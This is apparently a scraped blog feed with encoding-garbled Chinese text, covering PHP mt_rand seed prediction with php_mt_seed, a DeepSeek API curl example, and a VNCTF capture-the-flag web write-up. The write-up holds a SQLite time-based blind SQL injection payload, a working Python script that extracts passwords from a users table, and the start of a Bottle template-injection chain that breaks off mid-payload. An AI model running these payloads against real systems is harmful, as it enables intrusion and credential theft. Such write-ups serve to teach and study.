    <content type="html"><![CDATA[<h1 id="mt-rand-å­˜åœ¨çš„é—®é¢˜"><a href="#mt-rand-å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="mt_rand()å­˜åœ¨çš„é—®é¢˜"></a><strong>mt_rand()å­˜åœ¨çš„é—®é¢˜</strong></h1><p>mt_rand()å¦‚ä½•ç”Ÿæˆçš„éšæœºæ•´æ•°ï¼Œå®ƒä¸è®¾ç½®çš„seedå€¼å’Œè°ƒç”¨è¯¥å‡½æ•°çš„æ¬¡æ•°æœ‰å…³ï¼Œå‡è®¾ä½¿ç”¨mt_srand(12345)è¿›è¡Œäº†ä¸€æ¬¡æ’­ç§ï¼Œé‚£ä¹ˆç¬¬ä¸€æ¬¡è°ƒç”¨mt_randç”Ÿæˆçš„æ•°å€¼ä¸ºaï¼Œç¬¬äºŒæ¬¡ä¸ºbï¼Œç¬¬ä¸‰æ¬¡ä¸ºcã€‚æ‰€ä»¥å½“æœ‰äººæ‹¿åˆ°ä¸ä½ ä¸€ä¸²ä¸€æ¨¡ä¸€æ ·çš„seedæ—¶ï¼Œæ‰€æ‰§è¡Œçš„ç»“æœéƒ½æ˜¯è·Ÿåˆšåˆšæè¿°çš„ä¸€æ ·ï¼Œè¿™æ ·å°±å¯ä»¥é¢„æµ‹å‡ºæ¥ä¸‹æ¥çš„æ•°å€¼æ˜¯å¤šå°‘<br>éªŒè¯ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">11111111</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º11111111æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;å½“randå€¼ä¸º123æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>å½“randå€¼ä¸º<span class="hljs-number">11111111</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:<br><span class="hljs-number">1275140870</span><br><span class="hljs-number">304669862</span><br><span class="hljs-number">188245067</span><br><span class="hljs-number">1742075826</span><br><span class="hljs-number">1668666189</span><br>å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—:<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>å½“randå€¼ä¸º<span class="hljs-number">123</span>æ—¶ç”Ÿæˆçš„ä¼ªéšæœºæ•°åˆ—ï¼š<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br></code></pre></td></tr></table></figure><p>å‘ç°å¯¹äºä¸€ä¸ªç§å­ï¼Œé¢˜ç›®éšæœºæ•°ç”Ÿæˆçš„æ˜¯ä¸€æ ·çš„</p><h1 id="php-mt-seed4-0å·¥å…·"><a href="#php-mt-seed4-0å·¥å…·" class="headerlink" title="php_mt_seed4.0å·¥å…·"></a>php_mt_seed4.0å·¥å…·</h1><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/openwall/php_mt_seed<br><span class="hljs-built_in">cd</span> php_mt_seed<br>make<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ–¹æ³•ï¼š</p><blockquote><p>time å¼€å¤´ï¼Œä½¿ç”¨ .&#x2F; æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åºï¼Œåé¢å†æ¥ä¸Šå¸Œæœ›é€†æ¨çš„éšæœºæ•°å­—èŠ‚</p></blockquote><p>éšæœºæ•°è½¬å­—èŠ‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$dict</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$response</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dict</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$j</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dict</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$j</span>]) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; 0 &#x27;</span> . (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27; &#x27;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-string">&quot;è¾“å…¥&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="ç‰¹æ®Šæƒ…å†µ"><a href="#ç‰¹æ®Šæƒ…å†µ" class="headerlink" title="ç‰¹æ®Šæƒ…å†µ"></a>ç‰¹æ®Šæƒ…å†µ</h1><p>è€Œä¸”æ•°æ®å¯ä»¥æŒ‰æ¬¡æ•°æ¨çš„ï¼Œå¦‚æœè¿è¡Œäº†ä¸¤æ¬¡éšæœºæ•°</p><p>å‡è®¾ç”Ÿæˆäº†12ä½çš„éšæœºå­—ç¬¦ä¸²ï¼Œç”Ÿæˆäº†ä¸¤æ¬¡ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ç¬¬ä¸€æ¬¡çš„ï¼Œä½†æ˜¯çŸ¥é“ç¬¬äºŒæ¬¡çš„</p><p>æˆ‘ä»¬å¯ä»¥å†ç¬¬äºŒæ¬¡å¤„ç†åçš„å­—èŠ‚å‰åŠ ä¸Š12ç»„<code>0 0 0 0</code></p><p>ä¹Ÿå¯ä»¥å°†ç§å­çˆ†ç ´å‡ºæ¥</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>phpä¼ªéšæœºæ•°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API</title>
    <link href="/2025/02/15/API%E4%B8%8Edeepseek/"/>
    <url>/2025/02/15/API%E4%B8%8Edeepseek/</url>
    
    <content type="html"><![CDATA[<h1 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h1><h2 id="ä»€ä¹ˆæ˜¯API"><a href="#ä»€ä¹ˆæ˜¯API" class="headerlink" title="ä»€ä¹ˆæ˜¯API"></a>ä»€ä¹ˆæ˜¯API</h2><p>AIçš„APIåŸºæœ¬éƒ½éµå¾ªopenaiçš„æœ€æ—©å‘å¸ƒçš„APIæ ¼å¼(ä»¥deepseekä¸ºä¾‹)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>è§£é‡Š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions <br></code></pre></td></tr></table></figure><blockquote><p>è¯·æ±‚å¤´éƒ¨ï¼šä½ è¦è¯·æ±‚çš„æœåŠ¡æä¾›å•†</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¯·æ±‚æ ¼å¼ï¼šè®¾ç½®ä¸ºjsonæ ¼å¼   ps:APIéƒ½æ˜¯POSTä¼ å‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> <br></code></pre></td></tr></table></figure><blockquote><p>ä½ çš„APIå¯†é’¥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>å‘é€çš„æ•°æ®ï¼š</p><p>modelï¼šæ¨¡å‹åç§°ï¼›ä»¥å®˜æ–¹ä¸ºå‡†</p><p>messagesï¼šæ¶ˆæ¯ä¸»ä½“,ä»¥å­—å…¸æ•°ç»„æ ¼å¼ã€‚roleï¼šç”¨æˆ·    contentï¼šæ¶ˆæ¯</p></blockquote><p>ä½†æ˜¯æˆ‘çš„deekseekæ²¡é’±äº†ï¼Œç”¨NAIDIAåšæ¼”ç¤ºä¸€æ ·çš„</p><p>å‘é€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://integrate.api.nvidia.com/v1/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer API-key&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-ai/deepseek-r1&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>å›æ˜¾</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ae53374d84f74e1baf5e47f70108fd24&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;chat.completion&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;created&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1739601068</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deepseek-ai/deepseek-r1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;choices&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;assistant&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? ğŸ˜Š&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tool_calls&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logprobs&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;finish_reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stop&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;matched_stop&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;usage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;total_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">21</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prompt_tokens_details&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? ğŸ˜Š&quot;,&quot;tool_calls&quot;:null&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF-web</title>
    <link href="/2025/02/11/VNCTF-web/"/>
    <url>/2025/02/11/VNCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="å¥¶é¾™å›å®¶"><a href="#å¥¶é¾™å›å®¶" class="headerlink" title="å¥¶é¾™å›å®¶"></a>å¥¶é¾™å›å®¶</h1><p> è¾“å…¥<code>1&#39;</code>å›æ˜¾</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" alt="image-20250214130506725"></p><p>ä½†æ˜¯è¾“å…¥<code>1&#39;&#39;</code>ä¸¤ä¸ªå•å¼•å·</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" alt="image-20250214130543617"></p><p>æ­£å¸¸å›æ˜¾ï¼Œè¯´æ˜å­˜åœ¨sqlæ³¨å…¥</p><p>å…ˆfuzzä¸€ä¸‹</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" alt="image-20250214131102161"></p><p>è¿‡æ»¤äº†ä¸€ç‚¹è€Œä¸”å¯¹å¤§å°å†™æ•æ„Ÿï¼ŒçŒœæµ‹æ˜¯<code>sqlite</code>(ä¹Ÿå¯èƒ½æ˜¯æ­£åˆ™ï¼‰ï¼Œæ‰“æ—¶é—´ç›²æ³¨ï¼Œé‚£ä»–è¿‡æ»¤sleepå¹²å˜›ï¼Œè¿·æƒ‘æˆ‘ä»¬å—</p><p>æ—¢ç„¶çŒœæµ‹æ˜¯<code>sqlite</code>é‚£å°±ä½¿ç”¨<code>randombolb</code>å‡½æ•°è¯•è¯•</p><p>ç©ºæ ¼ä½¿ç”¨<code>/**/</code>è¿‡æ»¤</p><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">payload = &quot;&#x27;OR/**/(case/**/when(substr(sqlite_version(),1,1)&lt;&#x27;310&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--&quot;<br></code></pre></td></tr></table></figure><p>å¤§ä½¬çš„è„šæœ¬(äºŒåˆ†æ³•)                                                                          </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:47163/login&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># payload = &#x27;sqlite_version()&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/from/**/sqlite_master&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\&#x27;table\&#x27;/**/AND/**/name=\&#x27;users\&#x27;;&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(username)/**/from/**/users&#x27;</span><br>        payload = <span class="hljs-string">&#x27;select/**/group_concat(password)/**/from/**/users&#x27;</span><br>        username = <span class="hljs-string">&#x27;baozongwi&#x27;</span><br>        char = <span class="hljs-built_in">chr</span>(mid)<br>        password = <span class="hljs-string">&quot;&#x27;or/**/(case/**/when(substr((&#123;&#125;),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;</span>.<span class="hljs-built_in">format</span>(<br>            payload, i, char)<br>        json = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: username,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url=url, json=json, timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">except</span> Exception:<br>            head = mid + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]result: <span class="hljs-subst">&#123;result&#125;</span>&#x27;</span>)<br><br><br><br></code></pre></td></tr></table></figure><h1 id="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"><a href="#å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ" class="headerlink" title="å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ"></a><strong>å­¦ç”Ÿå§“åç™»è®°ç³»ç»Ÿ</strong></h1><p>å†™äº†ä¸€ä¸‹è¿™ä¸ªé¢˜ç›®ï¼Œèµ·åˆä»¥ä¸ºåªæ˜¯ç®€å•çš„sstiï¼Œä½†æ˜¯å‘ä¸‹æ˜¯bottleæ¨¡æ¿ï¼Œè€Œä¸”è¿˜é™åˆ¶äº†é•¿åº¦</p><p>é¢˜ç›®æç¤ºè¦å¤šè¡Œï¼Œåˆšå¼€å§‹æƒ³çš„æ˜¯<code>&#123;%set%&#125;</code>,ä¸çŸ¥é“æ˜¯botlleæ¨¡æ¿ï¼Œä¸çŸ¥é“æ²¡æœ‰è¿™ä¸ª</p><p><a href="https://www.osgeo.cn/bottle/stpl.html">bottleå¼€å‘æ–‡æ¡£</a></p><p>æœ‰ä¸€ä¸ªæ–°çš„çŸ¥è¯† <code>:=</code>ç‚¹å†python3.8ä»¥åå°±æœ‰äº†è¿™ä¸ªè¿ç®—ç¬¦</p><p> Bottle çš„æ¨¡æ¿å¼•æ“ä¾èµ–äº Python çš„è¡¨è¾¾å¼æ±‚å€¼ï¼Œä½†å®ƒå¹¶ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„ Python è§£é‡Šå™¨ã€‚åœ¨æ¨¡æ¿ä¸­ï¼Œåªæœ‰å¯ç›´æ¥æ±‚å€¼çš„è¡¨è¾¾å¼æ‰èƒ½é€šè¿‡ <code>&#123;&#123;...&#125;&#125;</code> è¯­æ³•åµŒå…¥ã€‚å› æ­¤ï¼Œ<code>a=5</code> è¿™æ ·çš„èµ‹å€¼è¯­æ³•ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ï¼Œå› ä¸ºèµ‹å€¼æœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªè¿”å›å€¼çš„è¡¨è¾¾å¼ï¼Œè€Œæ˜¯ä¸€ä¸ªæ“ä½œ</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-number">5</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215171504250.png" alt="image-20250215171504250"></p><p>é‚£ä¹ˆå°±å¯ä»¥å†™äº†</p><p>payloadï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a:</span>=<span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">b:</span>=a.__class__&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span 